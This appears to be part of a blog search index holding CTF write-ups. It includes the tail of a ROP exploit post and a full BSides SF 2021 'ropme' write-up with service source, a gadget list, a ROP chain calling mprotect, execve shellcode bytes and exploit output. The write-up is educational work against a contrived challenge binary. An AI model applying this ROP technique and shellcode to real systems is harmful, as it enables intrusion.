0x40, 0x00, 0x00, 0x00, 0x00, 0x00, // syscall 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // ... 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, }; First 24 bytes are the filler for the stack - recall that the function subtracts 0x10 from the stack pointer and pops a register. The first two gadets are the XOR gadgets we\u0026rsquo;ve determined with permute.py. The next gadget pops 0x19 into rdx, which is the length of our read. Finally, we shove the read syscall number into rax and call it. Then we simply use the gadgets to load the write syscall number and place stdout file decriptor (1) as its first argument. The other two arguments in registers rsi and rdx remain the same throughout the exploit. That\u0026rsquo;s it!\n[joey@gibson]$ ./exploit CCC{math_is_hard_1234897} ", 
        "url": "http:\/\/localhost:1313\/posts\/weirdrop\/"
    },
    
    "http:\/\/localhost:1313\/tags\/ctf\/": {
        "title": "CTF",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/ctf\/"
    },
    
    "http:\/\/localhost:1313\/tags\/pwn\/": {
        "title": "Pwn",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/pwn\/"
    },
    
    "http:\/\/localhost:1313\/tags\/rop\/": {
        "title": "ROP",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/rop\/"
    },
    
    "http:\/\/localhost:1313\/posts\/ropme\/": {
        "title": "BSIDES SF 2021: ropme",
        "tags": ["CTF","ROP","pwn","linux",],
        "content": "I didn\u0026rsquo;t really participate in the ctf, but I found this challenge to be interesting and since not many teams solved it/posted writeups I decided to post my solution. It\u0026rsquo;s probably not the most elegant - if you solved it in a different way I\u0026rsquo;d love to hear about it. The exploit source can be found here. In this writeup, I\u0026rsquo;m assuming you have a basic understanding of x86 architecture, return oriented programming, and the Linux API.\nExploitable Service We\u0026rsquo;re given a service binary and its source code.\n[joey@gibson]$ file ropme ropme: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=b82649cdb66e4b3f92ea5fd28e374b5793cb9f26, not stripped The target binary is a 32-bit ELF. This will be useful when we are writing our exploit. Let\u0026rsquo;s take a look at the important parts of the source code.\n// Generate a random block of +rwx memory that\u0026#39;ll be filled randomly uint32_t *random_code = mmap((void*)CODE_START, CODE_LENGTH, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANONYMOUS | MAP_PRIVATE, 0, 0); // Allocate memory for the user to send us a stack - it\u0026#39;s just +rw uint8_t *stack = mmap((void*)STACK_START, STACK_LENGTH, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, 0, 0); ... alarm(TIME); // Set the randomness in stone at the outset time_t t = time(NULL); // Immediately let the user know how much time they have printf(\u0026#34;The current time is: %ld\\n\u0026#34;, t); printf(\u0026#34;You have %d seconds to make this work\\n\u0026#34;, TIME); // Populate the random code block using a predictable RNG int i; srand(t); for(i = 0; i \u0026lt; CODE_LENGTH / 4; i++) { random_code[i] = rand(); } The service allocates two memory regions:\nrandom_code with read, write, and exec permissions at address CODE_START (0x13370000)\nstack with just read and write permissions and an address chosen by the system (STACK_LENGTH is NULL)\nThe program uses time(2) to generate the seed for pseudo-random number generation and conveniently tells the client what that seed is. It proceeds to fill random_code memory region with (you guessed it!) pseudo-random 32-bit numbers.\nFinally the service reads STACK_LENGTH bytes of user input into the stack region, uses asm(3) to clear all of the registers, set the stack pointer (esp) to the stack memory region and immediately ret\u0026rsquo;s.\nWhat\u0026rsquo;s going on here? Essentially, a contrived example of a stack overflow vulnerability, exploitable via Return Oriented Programming (ROP). Instead of writing a vulnerable program, the author of this challenge cut to the chase and generated an artificial stack for our exploit. The first thing that happens after we populate that stack is the ret operation, so we already control the instruction pointer (eip) with the first four bytes of our input.\nDumpster diving for gadgets We control eip but the only place we can reliably jump to is the random_code memory region, filled with junk. Lots of interesting things can be found in the junk!\nTurns out if you generate 0x500000 of pseudo-random bytes, some of those bytes will happen to be ROP gadgets. Remember that we are handed over the seed for pseudo-random number generation, which means we can recreate random_code locally (even if we weren\u0026rsquo;t given the seed - one second is a long time - we could call time(2) locally and get the same result).\nThe exploitation plan is straightforward - generate the same random memory that the service did and find the necessary gadgets for our ROP chain. There\u0026rsquo;s only one problem - our ROP gadgets can\u0026rsquo;t be too long. The longer the instruction the less chances we have of finding it in the randomly initialized memory.\nWhat happens if not all gadgets are present? We just try again! I wrapped my exploit with a shell script that kept trying until the exploit was successful. Through trial and error I found that we can find any two-byte gadget (including ret) with every attempt. A three-byte gadget already calls for some bruteforcing, so we must keep those to a minimum (my ROP chain ended up having two three-byte gadgets - I bet there\u0026rsquo;s a better solution out there).\nExploit methodology The goal of this challenge is to read the contents of /home/ctf/flag.txt. As is often the case with restricted exploitation environment, instead of attacking this problem head-on, we will modify the environment to make exploitation easier for us. We have full control over the stack, but it is set as non-executable. Our ROP chain will have to change the stack memory region permissions to executable. Then we simply jump into the stack and execute the second stage shellocde, which will read the flag for us.\nTo change permissions of a memory region, we utilize the mprotect(2) system call. If you\u0026rsquo;ve read the man page you know that mprotect might expect a page-aligned address and length. Since we don\u0026rsquo;t know the stack address, the first thing our ROP chain needs to do is grab the stack address from the stack pointer. As this is our first operation, esp will be pointing at stack+4, so we decrement ebx four times. Now we pop the rest of the arguments and the syscall number to the respective registers and run int 0x80 (remember we\u0026rsquo;re dealing with a 32-bit system).\nHere is the list of gadgets we\u0026rsquo;re looking for:\n; gadget 0 ; used to grab the stack address 89 e3 mov ebx, esp c3 ret ; gadget 1 ; used to page align the stack address 4b dec ebx c3 ret ; gadget 2 ; used for syscall parameter loading 58 pop eax c3 ret ; gadget 3 ; used for syscall parameter loading 59 pop ecx c3 ret ; gadget 4 ; used for syscall parameter loading 5a pop edx c3 ret ; gadget 5 ; everyone\u0026#39;s favorite interrupt cd 80 int 0x80 c3 ret ; gadget 6 ; jump to our second stage shellcode ff e4 jmp esp The stack layout will look like this:\n*((uint32_t *)(exploit+0)) = mov_ebx; // address of mov ebx, esp gadget *((uint32_t *)(exploit+4)) = dec_ebx; // address of dec ebx gadget *((uint32_t *)(exploit+8)) = dec_ebx; *((uint32_t *)(exploit+12)) = dec_ebx; *((uint32_t *)(exploit+16)) = dec_ebx; *((uint32_t *)(exploit+20)) = pop_eax; // address of pop eax gadget *((uint32_t *)(exploit+24)) = 125; // __NR_mprotect *((uint32_t *)(exploit+28)) = pop_ecx; // address of pop ecx gadget *((uint32_t *)(exploit+32)) = 4096; // page-aligned stack size *((uint32_t *)(exploit+36)) = pop_edx; // address of pop edx gadget *((uint32_t *)(exploit+40)) = (PROT_EXEC|PROT_WRITE|PROT_READ); *((uint32_t *)(exploit+44)) = int_80; // address of int 0x80 gadget *((uint32_t *)(exploit+48)) = jmp_esp; // address of jmp esp gadget Upon returning from mprotect we should be able to jump to esp. There\u0026rsquo;s a caveat. The calling convention uses the stack for arguments, but we\u0026rsquo;re already using the stack for our code. We need a new stack! Seems obvious, but I took that for granted and spent an hour wondering why my exploit was coring. Fortunately, we can just use random_code segment as our new stack. The first order of business in our second stage shellcode will be to move an address in random_code into esp. Besides that it\u0026rsquo;s just a vanilla execve shellcode that\u0026rsquo;s going to cat the flag.\n0xbc, 0x00, 0x00, 0x38, 0x13, // mov esp,0x133800000 ; new stack 0x6a, 0x0b, // push 0xb 0x58, // pop eax 0x31, 0xd2, // xor edx,edx 0x52, // push edx 0x68, 0x2f, 0x63, 0x61, 0x74, // push 0x7461632f 0x68, 0x2f, 0x62, 0x69, 0x6e, // push 0x6e69622f 0x89, 0xe3, // mov ebx,esp 0x68, 0x78, 0x74, 0x00, 0x00, // push 0x7478 0x68, 0x61, 0x67, 0x2e, 0x74, // push 0x742e6761 0x68, 0x66, 0x2f, 0x66, 0x6c, // push 0x6c662f66 0x68, 0x65, 0x2f, 0x63, 0x74, // push 0x74632f65 0x68, 0x2f, 0x68, 0x6f, 0x6d, // push 0x6d6f682f 0x89, 0xe1, // mov ecx,esp 0x52, // push edx 0x51, // push ecx 0x53, // push ebx 0x89, 0xe1, // mov ecx,esp 0xcd, 0x80, // int 0x80 0x6a, 0x01, // push 0x01 0x58, // pop eax 0x31, 0xdb, // xor ebx, ebx 0xcd, 0x80, // int 0x80 Let\u0026rsquo;s see the exploit in action:\n[joey@gibson]$ ./exploit === Generating random memory with seed 1615121940 ... =!!= Found EBX mov gadget @ 0x135e533c =!!= Found INT 0x80 gadget @ 0x1385c0c8 =-= All gadgets are present! Sending the exploit.. CTF{bounce_bounce_bounce} ", 
        "url": "http:\/\/localhost:1313\/posts\/ropme\/"
    },
    
    "http:\/\/localhost:1313\/categories\/": {
        "title": "Categories",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/categories\/"
    },
    
}
</script>
<script defer src="/js/lunr.js"></script>
<script defer src="/js/search.js"></script>

</footer>

</body>
</html>

